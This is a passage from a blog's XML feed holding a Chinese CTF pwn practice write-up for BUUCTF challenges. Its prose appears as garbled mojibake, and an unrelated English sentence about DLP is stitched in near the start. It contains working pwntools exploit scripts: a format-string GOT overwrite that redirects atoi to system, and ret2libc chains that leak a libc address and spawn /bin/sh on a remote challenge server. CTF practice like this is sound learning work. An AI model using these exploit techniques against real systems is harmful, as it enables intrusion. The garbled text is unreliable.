href="https://blog.csdn.net/vvbbnn00/article/details/128721089?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167629589916800211554804%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167629589916800211554804&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-128721089-null-null.142%5Ev73%5Ewechat,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=hgame2023&spm=1018.2226.3001.4187">wp<i class="fas fa-external-link-alt"></i></a></p><p>DLP helps to classify and tag data securely and flags unusual activity around it</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFæ¯”èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-PWNåˆ·é¢˜ç¬”è®°</title>
      <link href="/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/"/>
      <url>/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p><code>Well begun is half done.</code></p></blockquote><span id="more"></span><h1 id="BUU-PWNåˆ·é¢˜ç¬”è®°"><a href="#BUU-PWNåˆ·é¢˜ç¬”è®°" class="headerlink" title="BUU-PWNåˆ·é¢˜ç¬”è®°"></a>BUU-PWNåˆ·é¢˜ç¬”è®°</h1><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226175437031.534yw6j44a2o.webp"></p><p>ï¼ˆè¿™ä¹ˆå¯çˆ±çš„åˆ·é¢˜ç½‘ç«™ï¼Œè¿™è¿˜ä¸åˆ·ï¼Ÿï¼Ÿï¼Ÿï¼ï¼ï¼ï¼‰</p><h2 id="0x0"><a href="#0x0" class="headerlink" title="0x0"></a>0x0</h2><p>ç­¾åˆ°</p><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>ret2text</p><h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194855385.4d4ve3gqsj5s.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226194952701.62vsmrp0e7eo.webp"></p><p>æ²¡å•¥æ„ä¹‰ï¼Œret2textã€‚</p><p>å€’æ˜¯å­¦ä¹ äº†ä¸€ä¸‹Cè¯­è¨€çš„writeå‡½æ•°å’Œsprintfå‡½æ•°</p><p><a class="link" href="https://blog.csdn.net/BlizCp/article/details/112056833?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167205543616800182763246%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167205543616800182763246&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-112056833-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=sprintf%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">sprintfå‡½æ•°<i class="fas fa-external-link-alt"></i></a>            <a class="link" href="https://blog.csdn.net/IOT2017/article/details/84137728?ops_request_misc=&request_id=&biz_id=102&utm_term=C%E8%AF%AD%E8%A8%80write%E5%87%BD%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-3-84137728.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">writeå‡½æ•°<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226201240586.kop6vd2s8j4.webp"></p><p><a class="link" href="https://blog.csdn.net/you_shou/article/details/51248677?ops_request_misc=&request_id=&biz_id=102&utm_term=setvbuf%E5%87%BD%E6%95%B0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-2-51248677.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">setvbufå‡½æ•°<i class="fas fa-external-link-alt"></i></a></p><p><mark>è¿™é‡Œè®°å½•ä¸€ä¸ªå‘ï¼Œæµå’Œç¼“å†²åŒºçš„çŸ¥è¯†</mark></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221226202344593.36lr8pn9xczk.webp"></p><p>è¿™é“é¢˜æœ‰æ„æ€ï¼Œè™½ç„¶å¯ä»¥ç”¨æ˜¯ret2textï¼Œä½†æ˜¯å¢åŠ äº†åŸºæœ¬åˆ¤æ–­æ¡ä»¶.</p><p>å³æœ‰ä¸¤ç§ä¸»æµæ–¹æ³•ï¼šret2text and æ”¹v2çš„å€¼</p><p>è®°å½•ä¸€ä¸‹æ”¹v2çš„å€¼ï¼ˆè®¡ç®—æœºå†…æµ®ç‚¹æ•°çš„è¡¨ç¤ºï¼‰</p><blockquote><p>11.28125<br>è½¬æ¢æˆäºŒè¿›åˆ¶ï¼š1011.001001 = 1.01101001 * 10^3<br>bin(127+3) =10000010<br>0 10000010 01101001<br>å› ä¸ºæ˜¯floatè¡¥é½32ä½<br>0100 0001 0011 0100 1000 0000 0000 0000</p></blockquote><p>å‚è€ƒèµ„æ–™ï¼š</p><p><a class="link" href="https://blog.csdn.net/qq_34720818/article/details/108285655?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%AE%E7%82%B9%E6%95%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98%E5%82%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-108285655.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">æµ®ç‚¹æ•°(å°æ•°)åœ¨è®¡ç®—æœºä¸­å¦‚ä½•ç”¨äºŒè¿›åˆ¶å­˜å‚¨ï¼Ÿ<i class="fas fa-external-link-alt"></i></a></p><p><a class="link" href="https://blog.csdn.net/m0_51688704/article/details/126222981?ops_request_misc=&request_id=&biz_id=102&utm_term=%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B5%AE%E7%82%B9%E6%95%B0%E5%A6%82%E4%BD%95%E5%9C%A8%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%86%85%E5%AD%98%E5%82%A8&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-126222981.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&spm=1018.2226.3001.4187">æµ®ç‚¹æ•°åœ¨è®¡ç®—æœºå†…å­˜ä¸­æ˜¯å¦‚ä½•å­˜å‚¨çš„ï¼Ÿä¸€æ–‡å¸¦ä½ äº†è§£è¯¦æƒ…<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221227213546545.jfzw85m4r5c.webp"></p><p><a class="link" href="https://blog.csdn.net/digitalkee/article/details/122490373?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167214816316800188546026%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167214816316800188546026&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-122490373-null-null.142%5Ev68%5Econtrol,201%5Ev4%5Eadd_ask,213%5Ev2%5Et3_esquery_v2&utm_term=fgets%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">fgets<i class="fas fa-external-link-alt"></i></a></p><p>æ˜¾ç„¶æ¼æ´åœ¨strcpyï¼Œæ˜æ˜¾æ ˆæº¢å‡ºæ¼æ´ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20221227221717511.3toatkp5hegw.webp"></p><p>æ¯”è¾ƒå¥‡æ€ªï¼Œè¾“å…¥32ä¸ªå­—èŠ‚ï¼Œåªè¾“å‡º31å­—èŠ‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;I&#x27; * 20+b&#x27;a&#x27;*(0x4) + p64(0x08048F13)</span><br></pre></td></tr></table></figure><h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5"></a>0x5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230108191008284.54osqokl7ibk.webp"></p><p>ret2textæ²¡å•¥å¥½è¯´çš„</p><p><mark>readå‡½æ•°çš„å­¦ä¹ </mark></p><h2 id="0x6-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5"><a href="#0x6-ç¬¬äº”ç©ºé—´2019-å†³èµ›-PWN5" class="headerlink" title="0x6.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5"></a>0x6.[ç¬¬äº”ç©ºé—´2019 å†³èµ›]PWN5</h2><h3 id="1-é¢˜ç›®è¯¦æƒ…"><a href="#1-é¢˜ç›®è¯¦æƒ…" class="headerlink" title="1.é¢˜ç›®è¯¦æƒ…"></a>1.é¢˜ç›®è¯¦æƒ…</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230110205820206.1x795if2y51c.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230110205943458.47hxr869dgzk.webp"></p><h3 id="2-é¢˜ç›®åˆ†æ"><a href="#2-é¢˜ç›®åˆ†æ" class="headerlink" title="2.é¢˜ç›®åˆ†æ"></a>2.é¢˜ç›®åˆ†æ</h3><ol><li><a class="link" href="https://blog.csdn.net/u010806950/article/details/105505540?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167331730916782425683150%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167331730916782425683150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-105505540-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=atoi%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">atoiå‡½æ•°<i class="fas fa-external-link-alt"></i></a>ï¼šæŠŠå­—ç¬¦ä¸²nptrè½¬æ¢ä¸ºintã€‚<a class="link" href="https://blog.csdn.net/Hush_H/article/details/127405849?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167331730916782425683150%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167331730916782425683150&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-127405849-null-null.142%5Ev70%5Econtrol,201%5Ev4%5Eadd_ask&utm_term=atoi%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">atoiå‡½æ•°2<i class="fas fa-external-link-alt"></i></a></li><li>è¿™é“é¢˜ï¼Œæˆ‘å·¦æ€å³æƒ³éƒ½æ²¡æƒ³æ˜ç™½è¯¥æ€ä¹ˆå»åšï¼Œæ— å¥ˆä¹‹ä¸‹å»ç½‘ä¸Šæœäº†ä¸€ä¸‹Writeupï¼Œä¸€çœ‹å±…ç„¶æ˜¯è€ƒçš„æ˜¯<mark>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</mark>ï¼Œæˆ‘è¿˜å‚»å‚»çš„æ‹¿ç€æˆ‘åªæœ‰ret2text/ret2shellcode/ret2syscallçš„çŸ¥è¯†ä½“ç³»å»è§£é¢˜â€¦â€¦æ…¢æ…¢ç§¯ç´¯å§ï¼</li><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„æˆå› åœ¨äºåƒ<code>printf/sprintf/snprintf</code>ç­‰æ ¼å¼åŒ–æ‰“å°å‡½æ•°éƒ½æ˜¯æ¥å—å¯å˜å‚æ•°çš„ï¼Œè€Œä¸€æ—¦ç¨‹åºç¼–å†™ä¸è§„èŒƒï¼Œæ¯”å¦‚æ­£ç¡®çš„å†™æ³•æ˜¯ï¼š<code>printf(&quot;%s&quot;, pad)</code>ï¼Œå·æ‡’å†™æˆäº†ï¼š<code>printf(pad)</code>ï¼Œæ­¤æ—¶å°±å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</li><li><strong>ï¼ˆå­˜ç–‘ï¼‰</strong>__readgsdwordå‡½æ•°ï¼šç”±äºç¨‹åºå¼€å¯äº†Canaryä¿æŠ¤ï¼Œæˆ‘åœ¨ç½‘ä¸Šæœç´¢å‘ç°è¿™ä¸ªå‡½æ•°è²Œä¼¼æ˜¯è°ƒç”¨å¾—åˆ°canaryçš„å€¼çš„å‡½æ•°ã€‚</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">printf(&quot;the third is %3$d, the first is %1$d&quot;,1,2,3,4,5,6);</span></span><br><span class="line"><span class="string"># the third is 3, the first is 1</span></span><br><span class="line"><span class="string">----------------------------------------------------------------------------</span></span><br><span class="line"><span class="string">p32(0x804c044)+p32(0x804c045)+p32(0x804c046)+p32(0x804c047)+b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line"><span class="string">å‰é¢çš„&quot;å­—ç¬¦ä¸²&quot;æœ‰16ä½å¯¹åº”0x10å³æŠŠè¯¥å€¼ä¿®æ”¹ä¸º0x10101010</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27; </span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">io = process(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/7&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25737)</span></span><br><span class="line">payload = p32(<span class="number">0x804c044</span>)+p32(<span class="number">0x804c045</span>)+p32(<span class="number">0x804c046</span>)+p32(<span class="number">0x804c047</span>)+<span class="string">b&#x27;%10$n%11$n%12$n%13$n&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment">#æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/7&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25068)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/7&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x7-ciscn-2019-c-1"><a href="#0x7-ciscn-2019-c-1" class="headerlink" title="0x7.ciscn_2019_c_1"></a>0x7.ciscn_2019_c_1</h2><ol><li><a class="link" href="https://blog.csdn.net/weixin_44162361/article/details/115790452?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167361105116800180632775%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167361105116800180632775&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-115790452-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=memset%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187">memsetå‡½æ•°<i class="fas fa-external-link-alt"></i></a></li></ol><h3 id="é¢˜ç›®è¯¦æƒ…"><a href="#é¢˜ç›®è¯¦æƒ…" class="headerlink" title="é¢˜ç›®è¯¦æƒ…"></a>é¢˜ç›®è¯¦æƒ…</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/image-20230113201313206.4jqyhi45uohs.webp"></p><h3 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><ol><li>å‘ç°äº†å±é™©å‡½æ•°getsä½†æ˜¯å¼€å¯äº†NXä¿æŠ¤æ’é™¤textå’Œshellcodeã€‚æˆ‘ç›®æµ‹ä¼°è®¡æ˜¯syscallã€‚è¯•è¯•å§ï¼ä½†æ˜¯ï¼Œæˆ‘å‘ç°ç¨‹åºé‡Œé¢å¹¶æ²¡æœ‰â€/bin/shâ€ã€‚æ‰€ä»¥è€ƒè™‘ä¸€ä¸‹ret2libcä¸­æ²¡æœ‰â€/bin/shâ€ï¼Œæ²¡æœ‰systemå‡½æ•°çš„è°ƒç”¨åœ°å€çš„æƒ…å†µå³æ˜¯<code>ret2libc3</code></li></ol><h3 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h3><p>â€‹    <strong>ç¬¬ä¸€ç§ï¼šLibSearcher</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/8&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26837</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/8&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,pop_rdi_ret,libc_start_main_got,puts_plt,main])</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)<span class="comment"># å› ä¸ºEncryptedå‡½æ•°æœ€åè¿”å›æ—¶å†æ¬¡è°ƒç”¨äº†putså‡½æ•°</span></span><br><span class="line"></span><br><span class="line">libc_start_main_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">print((c.recvline()))        # b&#x27;\xb0\x8a6\x85\xc0\x7f\n&#x27;                </span></span><br><span class="line"><span class="string">print((c.recvline())[:-1])      # discard &#x27;\n&#x27;</span></span><br><span class="line"><span class="string">print((c.recvline())[:-1].ljust(8,b&#x27;\0&#x27;)) #å·¦å¯¹é½ï¼Œå‡‘é½å…«å­—èŠ‚ï¼Œä¸è¶³ç”¨&#x27;\0&#x27;è¡¥é½</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here!!!!!&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–libcç‰ˆæœ¬</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_addr)</span><br><span class="line"><span class="comment"># åç§»é‡</span></span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"><span class="comment"># system &amp; bin_sh çœŸå®åœ°å€</span></span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,ret,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line"><span class="comment"># è¿™é‡Œçš„retæŒ‡ä»¤æ˜¯ä¸ºäº†å †æ ˆå¹³è¡¡ï¼Œå¦‚æœä¸åŠ çš„è¯åœ¨è°ƒç”¨systemå‡½æ•°ä¹‹å‰ï¼Œ88+8*2 =104 mod 16 â‰  0 ï¼Œè°ƒç”¨ä¼šå¤±è´¥ã€‚</span></span><br><span class="line"><span class="comment"># è°ƒç”¨retåï¼Œåœ¨è°ƒç”¨systemå‡½æ•°ä¹‹å‰ï¼Œ88+8*3 =112 mod 16 ï¼ 0 ï¼Œè°ƒç”¨æˆåŠŸã€‚</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    <strong>ç¬¬äºŒç§ï¼šæ‰‹åŠ¨ libc database search</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/8&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26837</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/8&quot;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,pop_rdi_ret,libc_start_main_got,puts_plt,main])</span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Ciphertext\n&quot;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">libc_start_main_addr = u64(c.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Here!!!!!&quot;</span>)</span><br><span class="line"><span class="comment"># åˆ©ç”¨æ³„éœ²å‡ºæ¥çš„libc_start_main_addrçš„æœ«12ä½ï¼ˆå¯¹åº”3ä½16è¿›åˆ¶ï¼‰åœ¨libc database searchä¸­æœç´¢</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_start_main_addr)) </span><br><span class="line"></span><br><span class="line">libcbase = libc_start_main_addr-<span class="number">0x021ab0</span></span><br><span class="line">system_addr = libcbase + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libcbase + <span class="number">0x1b3e9a</span></span><br><span class="line">c.sendlineafter(<span class="string">b&quot;Input your choice!\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x57</span>,ret,pop_rdi_ret,bin_sh,system_addr])</span><br><span class="line">c.recvuntil(<span class="string">b&quot;Input your Plaintext to be encrypted\n&quot;</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.1w1i75ahwp8g.webp"></p><h3 id="Get-flagï¼"><a href="#Get-flagï¼" class="headerlink" title="Get flagï¼"></a>Get flagï¼</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230117/%E5%9B%BE%E7%89%87.6lkaymio68lc.webp"></p><h2 id="0x8-ciscn-2019-n-8"><a href="#0x8-ciscn-2019-n-8" class="headerlink" title="0x8.ciscn_2019_n_8"></a>0x8.ciscn_2019_n_8</h2><p><img lazyload alt="image" 